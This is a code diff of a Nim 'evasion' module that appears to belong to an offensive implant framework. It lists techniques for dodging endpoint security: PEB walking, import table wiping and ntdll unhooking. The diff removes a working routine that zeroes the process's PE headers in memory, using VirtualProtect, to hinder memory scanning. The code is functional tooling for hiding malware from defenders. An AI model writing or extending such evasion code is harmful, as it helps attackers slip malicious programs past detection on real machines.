@@ -2,20 +2,10 @@
 ## Provides compile-time evasion techniques:
 ## - DFR: Dynamic Function Resolution via PEB walk
 ## - IAT obfuscation: Wipe import directory in memory
-## - PE header stomping: Zero out PE headers in memory
 ## - NTDLL unhooking: Load fresh ntdll from disk to bypass hooks
 
 import winim/lean
 import strenc
-
-# ---- nocrt stubs ----
-# When -nostartfiles is used, mingw's pseudo-relocation support and
-# DLL entry point are not linked. Compile the C stub to provide them.
-when defined(evasion_nocrt):
-  when defined(dll) or defined(service):
-    {.compile("nocrt_stub.c", "-DNOCRT_DLL").}
-  else:
-    {.compile: "nocrt_stub.c".}
 
 # ---- PEB structures ----
 type
@@ -71,7 +61,7 @@ proc djb2HashStrLower*(s: string): uint32 =
 
 # ---- PEB Walking ----
 
-when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_stomp_pe) or defined(evasion_iat_obf) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_iat_obf) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
   proc getPeb(): pointer =
     ## Get the PEB via inline assembly
     when defined(amd64):
@@ -180,38 +170,6 @@ when defined(evasion_dfr) or defined(evasion_indirect_syscalls):
     if moduleBase == nil:
       return nil
     return getExportByHash(moduleBase, functionNameHash)
-
-# ---- PE Header Stomping ----
-
-when defined(evasion_stomp_pe):
-  proc getCurrentModuleBase(): pointer =
-    ## Get the base address of the current process image from PEB
-    let peb = getPeb()
-    if peb == nil:
-      return nil
-    when defined(amd64):
-      return cast[ptr pointer](cast[int](peb) + 0x10)[]
-    else:
-      return cast[ptr pointer](cast[int](peb) + 0x08)[]
-
-  proc stompPeHeaders*() =
-    ## Zero out PE headers in memory to hinder memory scanning
-    let moduleBase = getCurrentModuleBase()
-    if moduleBase == nil:
-      return
-
-    let dosHeader = cast[PIMAGE_DOS_HEADER](moduleBase)
-    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](moduleBase) + dosHeader.e_lfanew)
-    let headerSize = ntHeaders.OptionalHeader.SizeOfHeaders.int
-
-    var oldProtect: DWORD
-    if VirtualProtect(moduleBase, headerSize.SIZE_T, PAGE_READWRITE, addr oldProtect) == 0:
-      return
-
-    zeroMem(moduleBase, headerSize)
-
-    var temp: DWORD
-    discard VirtualProtect(moduleBase, headerSize.SIZE_T, oldProtect, addr temp)
 
 # ---- NTDLL Unhooking ----
 
@@ -616,9 +574,6 @@ proc runEvasionInit*() =
 
   when defined(evasion_stack_spoof):
     initStackSpoof()
-
-  when defined(evasion_stomp_pe):
-    stompPeHeaders()
 
   when defined(evasion_iat_obf):
     obfuscateIat()
